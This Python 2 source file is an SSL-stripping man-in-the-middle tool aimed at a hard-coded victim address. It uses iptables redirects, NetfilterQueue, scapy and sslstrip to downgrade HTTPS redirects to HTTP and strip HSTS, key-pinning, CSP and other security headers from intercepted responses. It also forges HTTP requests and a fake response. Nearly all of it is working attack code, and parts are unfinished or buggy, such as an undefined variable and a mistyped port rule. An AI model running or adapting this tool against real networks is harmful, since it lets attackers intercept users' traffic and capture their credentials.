from scapy.all import *
from netfilterqueue import NetfilterQueue
from scapy.layers.http import *
import scapy

import os
import threading
import cryptography    #required for tls

load_layer("tls")    #enables tls for the https connection with the server

class SslRemover():

    def __init__(self, queue_num):

        self.queue         = NetfilterQueue()
        print queue_num
        self.iprule_add    = "iptables -A FORWARD -j NFQUEUE --queue-num {}".format(queue_num)
        self.iprule2_add    = "iptables -t nat -A PREROUTING -p tcp --destination-port 8 -j REDIRECT --to-port 80"
        self.iprule_remove = "iptables -D FORWARD -j NFQUEUE --queue-num {}".format(queue_num)
        self.iprule2_remove = "iptables -t nat -D PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 80"
        self.thread        = threading.Thread(name="ssl-remover-{}".format(queue_num), target=self.queue.run)
        self.thread.setDaemon(True)

        self.queue.bind(queue_num, self.handle_packet)

    def stripped_victim_automation(self):
        #socket = TCP_client.tcplink(HTTP, <>, 80)
        pass


    def tls_client_automation(self):
        #greeting = TLSClientHello(ciphers=<int code of the cipher suite>)
        connection = TLSClientAutomaton(dport=50000, client_hello=ch)
        connection.run()
    
    def handle_packet(self, packet_nfqueue):
        packet_scapy = IP(packet_nfqueue.get_payload())
        #print packet_scapy.show()
        
        #if not packet_scapy.haslayer(Raw):
        #    return packet_nfqueue.accept()
        #print "\n"
        
        #print packet_scapy.show()
        #print "\n"
        #if packet_scapy.haslayer(Raw):
            #payload = packet_scapy[Raw].load
            #print payload
            #if 'https' in payload:
            #    payload = payload.replace('https', 'http')
            #    packet_scapy[Raw].load = payload
            #    print "Changed Raw Payload"
            #    print packet_scapy[Raw].load
            #    del packet_scapy[IP].len
            #    del packet_scapy[IP].chksum
            #    del packet_scapy[TCP].chksum
            #    packet_nfqueue.set_payload(bytes(packet_scapy))
            #return packet_nfqueue.accept()
        '''
        if not packet_scapy.haslayer(Raw):
            return packet_nfqueue.accept()

        else:
            payload = packet_scapy[Raw].load
            print payload
            if payload[0]==0x17 and payload[1]==0x03 and payload[176]==0x00 and payload[177]==0x35:
                print "Haha"
                return packet_nfqueue.drop()
        
        return packet_nfqueue.accept()
        '''
        
        if packet_scapy.haslayer(HTTPResponse):
            print packet_scapy.show()
            if not packet_scapy[HTTPResponse].Location==None:
                packet_scapy[HTTPResponse].Location = (packet_scapy[HTTPResponse].Location).replace("https://", "http://")
            print packet_scapy[HTTPResponse].Location
            del packet_scapy[HTTPResponse].Strict_Transport_Security
            del packet_scapy[HTTPResponse].Public_Key_Pins
            del packet_scapy[HTTPResponse].Content_Security_Policy
            del packet_scapy[HTTPResponse].X_XSS_Protection
            del packet_scapy[HTTPResponse].X_Frame_Options

            packet_nfqueue.set_payload(bytes(packet_scapy))
            return packet_nfqueue.accept()


        if packet_scapy.haslayer(HTTPRequest):
            http_layer = packet_scapy[HTTPRequest]
            ip_layer = packet_scapy[IP]

            print "HTTP Request to {}{}".format(http_layer.Host.decode(), http_layer.Path.decode())
            

            new_packet = IP(src=ip_layer.src, dst=ip_layer.dst) / \
                         TCP(sport=packet_scapy[TCP].sport, dport=packet_scapy[TCP].dport, flags="PA") / \
                         HTTPRequest(
                             Method=http_layer.Method,
                             Host=http_layer.Host,
                             Path=http_layer.Path,
                             User_Agent=http_layer.User_Agent,
                             Accept=http_layer.Accept,
                             Accept_Language=http_layer.Accept_Language,
                             Accept_Encoding=http_layer.Accept_Encoding,
                             Connection=b'close'
                         )
            send(new_packet)
            print "Request packet made"

             # Create a fake HTTP response
            response_packet = IP(src=ip_layer.dst, dst=ip_layer.src) / \
                              TCP(sport=packet_scapy[TCP].dport, dport=packet_scapy[TCP].sport, flags="PA") / \
                              HTTPResponse(
                                  Content_Type=b"text/html",
                                  Content_Length=str(len([0,1,2])),
                                  Server=b"FakeServer"
                              )
    
            # Send the fake response
            send(response_packet)
            print "Response packet made"

        return packet_nfqueue.accept()
        

    def start(self):

        os.system(self.iprule_add)    #make sure SSL ssling
        #os.system(self.iprule2_add)    #make sure SSL ssling
        
        self.thread.start()    #queue starts accepting packages
        os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
        os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")
        os.system("sslstrip -l 8080")

        print "SSL stripping started"

    def stop(self):

        os.system(self.iprule_remove)    #make sure SSL nbot ssling
        #os.system("iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
        #os.system("iptables -t nat -D PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")
        #os.system(self.iprule2_remove)    #make sure SSL nbot ssling
        #os.system("sslstrip -k"
        self.queue.unbind()    #delete queue

        print "SSL stripping stopped"

if __name__ == "__main__":
    ip_victim = "10.0.123.5"
    ssl_remover = SslRemover(2)
    ssl_remover.start()
    time.sleep(20)
    ssl_remover.stop()
